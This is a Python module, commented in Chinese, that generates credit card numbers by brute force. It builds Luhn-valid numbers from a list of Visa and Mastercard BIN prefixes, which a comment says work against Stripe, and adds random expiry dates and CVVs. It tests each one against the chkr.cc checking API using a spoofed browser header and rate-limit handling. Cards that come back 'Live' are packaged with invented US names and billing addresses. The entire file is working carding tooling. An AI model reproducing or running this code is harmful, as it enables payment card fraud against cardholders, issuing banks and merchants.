#!/usr/bin/env python3
"""
chkr_cards.py — BIN 卡号生成 + chkr.cc 在线检测模块

用法:
  from chkr_cards import find_live_card
  cards = find_live_card(bins=["455673","545301"], needed=1)
  # => [{"cardNumber":..., "expiryMonth":..., "cvv":..., ...}]

环境变量:
  CHKR_BINS — 逗号分隔的 BIN 前缀 (默认: DEFAULT_BINS)
"""
import json
import os
import random
import time
import urllib.error
import urllib.request

# ── 常量 ─────────────────────────────────────────────────────────────────────
CHKR_API   = "https://api.chkr.cc/"
RATE_DELAY = 2.5   # 5 req/10s 限制 → 1 req/2.5s

# 默认 US Visa/MC BIN，已验证对 Stripe 有效
DEFAULT_BINS = [
    "455673", "455674", "401288", "426684", "431940",
    "441080", "400026", "406820", "456789", "465914",
    "545301", "511880", "556105", "524085", "535510",
    "400516", "402321", "423412", "476173", "489537",
]

_NAMES = [
    "Alex Johnson", "Sarah Williams", "Michael Brown",
    "Emily Davis", "James Wilson", "Jessica Martinez",
    "Daniel Lee", "Ashley Taylor", "Christopher Anderson",
    "Amanda Thomas", "Matthew Jackson", "Megan White",
]

_ADDRS = [
    "123 Main St, New York, NY, 10001",
    "456 Oak Ave, Los Angeles, CA, 90001",
    "789 Pine Rd, Chicago, IL, 60601",
    "321 Elm St, Houston, TX, 77001",
    "654 Maple Dr, Phoenix, AZ, 85001",
    "987 Cedar Ln, Philadelphia, PA, 19101",
    "147 Birch Way, San Antonio, TX, 78201",
    "258 Walnut Blvd, San Diego, CA, 92101",
    "369 Cherry St, Dallas, TX, 75201",
    "741 Spruce Ave, San Jose, CA, 95101",
]


# ── Luhn 算法 ─────────────────────────────────────────────────────────────────
def _luhn_check(digits: str) -> int:
    """返回使字符串通过 Luhn 校验的最后一位数字。"""
    total = 0
    for i, d in enumerate(reversed(digits)):
        n = int(d)
        if i % 2 == 0:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return (10 - (total % 10)) % 10


def gen_card_number(bin_prefix: str, length: int = 16) -> str:
    """从 BIN 前缀生成 Luhn 合法的完整卡号。"""
    needed  = length - len(bin_prefix) - 1
    middle  = "".join(str(random.randint(0, 9)) for _ in range(needed))
    partial = bin_prefix + middle
    return partial + str(_luhn_check(partial))


def gen_card_str(bin_prefix: str) -> str:
    """生成 chkr.cc 格式的卡串: NNNN|MM|YYYY|CVV"""
    card = gen_card_number(bin_prefix)
    mm   = str(random.randint(1, 12)).zfill(2)
    yyyy = str(random.randint(2026, 2030))
    cvv  = str(random.randint(100, 999))
    return f"{card}|{mm}|{yyyy}|{cvv}"


# ── chkr.cc API ───────────────────────────────────────────────────────────────
def check_card(card_str: str, charge: str = "0", timeout: int = 30):
    """
    调用 chkr.cc API 检测一张卡。
    返回 (code, status, message, card_dict)
      code: 1=Live, 0=Die, 2=Unknown, None=错误
    """
    data = json.dumps({"data": card_str, "charge": charge}).encode()
    req  = urllib.request.Request(
        CHKR_API, data=data,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "Origin":       "https://chkr.cc",
            "Referer":      "https://chkr.cc/",
            "User-Agent":   (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/131.0.0.0 Safari/537.36"
            ),
        },
        method="POST",
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        d    = json.loads(resp.read())
        return d.get("code"), d.get("status", ""), d.get("message", ""), d.get("card") or {}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")[:200]
        if e.code == 429:
            return None, "rate_limited", body, {}
        return None, f"http_{e.code}", body, {}
    except Exception as exc:
        return None, "error", str(exc)[:100], {}


# ── 主入口：找 Live 卡 ─────────────────────────────────────────────────────────
def find_live_card(bins=None, needed: int = 1, max_tries: int = 100,
                   log=print) -> list[dict]:
    """
    从给定 BIN 列表循环生成并检测，直到找到 `needed` 张 Live 卡。

    Returns:
        list of dicts, each containing:
          cardNumber, expiryMonth, expiryYear, cvv, lastFour,
          bank, type, country, status="ACTIVE",
          nameOnCard, billingAddress
    """
    if bins is None:
        env_bins = os.environ.get("CHKR_BINS", "")
        bins = [b.strip() for b in env_bins.split(",") if b.strip()] or DEFAULT_BINS

    live   = []
    tries  = 0
    _delay = RATE_DELAY

    while len(live) < needed and tries < max_tries:
        bin_prefix = random.choice(bins)
        card_str   = gen_card_str(bin_prefix)
        tries     += 1

        masked = f"{card_str[:6]}{'*'*6}{card_str[12:16]}"
        log(f"[chkr] #{tries}/{max_tries}  检测 {masked} ...")

        code, status, msg, card_data = check_card(card_str)

        if status == "rate_limited":
            log(f"[chkr] ⚠ 速率限制，等待 12s ...")
            time.sleep(12)
            _delay = min(_delay + 0.5, 5.0)
            continue

        time.sleep(_delay)

        if code == 1 or status == "Live":
            bank    = card_data.get("bank", "")
            ctype   = card_data.get("type", "")
            cat     = card_data.get("category", "")
            country = (card_data.get("country") or {}).get("name", "")
            emoji   = (card_data.get("country") or {}).get("emoji", "")
            log(f"[chkr] ✅ LIVE: {masked} | {bank} | {ctype}/{cat} | {emoji}{country}")

            parts = card_str.split("|")
            live.append({
                "card_str":      card_str,
                "cardNumber":    parts[0],
                "expiryMonth":   int(parts[1]),
                "expiryYear":    int(parts[2]),
                "cvv":           parts[3],
                "lastFour":      parts[0][-4:],
                "bank":          bank,
                "type":          ctype,
                "category":      cat,
                "country":       country,
                "status":        "ACTIVE",
                "nameOnCard":    random.choice(_NAMES),
                "billingAddress": random.choice(_ADDRS),
            })

        elif code == 0 or status == "Die":
            log(f"[chkr] ✗ Die: {msg[:80]}")
        else:
            log(f"[chkr] ? Unknown: code={code} status={status} {msg[:60]}")

    if len(live) < needed:
        log(f"[chkr] ⚠ 仅找到 {len(live)}/{needed} 张 Live 卡 (尝试 {tries} 次)")

    return live


# ── CLI 测试 ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    bins_arg = sys.argv[1].split(",") if len(sys.argv) > 1 else None
    needed   = int(sys.argv[2]) if len(sys.argv) > 2 else 1

    def _log(msg):
        from datetime import datetime
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    results = find_live_card(bins=bins_arg, needed=needed, log=_log)
    print(f"\n找到 {len(results)} 张 Live 卡:")
    for c in results:
        print(f"  {c['card_str']} | {c['bank']} | {c['nameOnCard']}")
